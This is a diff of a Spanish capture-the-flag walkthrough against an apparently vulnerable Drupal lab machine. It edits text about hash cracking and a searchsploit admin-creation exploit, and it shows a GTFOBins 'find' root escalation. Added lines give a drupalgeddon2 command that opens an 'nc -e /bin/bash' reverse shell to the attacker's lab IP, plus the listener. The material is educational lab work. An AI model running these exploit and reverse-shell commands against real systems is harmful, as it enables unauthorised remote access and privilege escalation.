@@ -146,14 +146,7 @@ select name, pass from users;
 
 ![imagen 17](https://github.com/user-attachments/assets/f6b5f408-f74c-472a-89d8-ae73828a361a)
 
-
-# REVISAR
-Podemos crackear el hash con `hashcat` o `john the ripper`, pero encontramos un exploit en `searchsploit` para crear un usuario administrador.
-Para obtener la contraseña del usuario admin podemos usar `hashcat` o `john the ripper`. Sin embargo, con searchsploit descubrimos un exploit que nos permite crear un usuario administrador, el cual utilizaremos para acceder al CMS:
-
-
-
-
+Podemos descifrar el hash con `hashcat` o `John the Ripper`, pero al realizar una búsqueda con `searchsploit`, encontramos un exploit que nos permite crear un usuario administrador. En lugar de recuperar la contraseña del usuario `admin`, utilizaremos este exploit para generar un nuevo usuario con privilegios administrativos y acceder al `CMS`.
 
 ![imagen 18](https://github.com/user-attachments/assets/1ab9d5ba-9577-4a08-a0fb-a108e2f2f014)
 
@@ -190,6 +183,8 @@ Buscamos binarios con permisos `SUID`:
 find / -perm -u=s 2>/dev/null
 ```
 
+`perm -u=s`: Filtra los archivos que tienen el bit SUID habilitado para el propietario del archivo, `-u=s` especifica que el bit SUID está establecido.
+
 ![imagen 25](https://github.com/user-attachments/assets/d01fb148-c3ab-4fea-b476-d919d85bd297)
 
 Identificamos `find` como vulnerable. Consultamos GTFOBins y explotamos `find` para obtener una shell como `root`:
@@ -202,8 +197,36 @@ find . -exec /bin/sh \; -quit
 
 Obtenemos la bandera final en `/root/flag.txt`.
 
+----
 
-## Variante utilizando unn reverse shell 
+## Variante utilizando una reverse shell
 
 ![reverse_shell](https://github.com/user-attachments/assets/b1cf36a8-1ae9-4afa-8290-81c30f7f8422)
+
+### Atacante:
+```bash
+python2 drupalgeddon2.py -h http://10.0.2.5 -c 'nohup nc -e /bin/bash 10.0.2.15 9000 &'
+```
+
+### Descripción:
+- `python2 drupalgeddon2.py`: Exploita una vulnerabilidad en Drupal para ejecutar comandos remotos.
+- `-h http://10.0.2.5`: Especifica la URL del objetivo.
+- `-c 'nohup nc -e /bin/bash 10.0.2.15 9000 &'`: Establece una conexión inversa con `netcat`.
+- `nohup`: Permite que el proceso continúe ejecutándose en segundo plano.
+- `nc -e /bin/bash 10.0.2.15 9000`: Conecta la shell a la máquina del atacante en el puerto `9000`.
+
+### Objetivo:
+```bash
+nc -lnvp 9000
+```
+
+### Descripción:
+- `nc -lnvp 9000`: Escucha conexiones entrantes en el puerto `9000`.
+  - `-l`: Modo de escucha.
+  - `-n`: No usa resolución de DNS.
+  - `-v`: Modo detallado (verbose).
+  - `-p 9000`: Especifica el puerto.
+
+
+
 
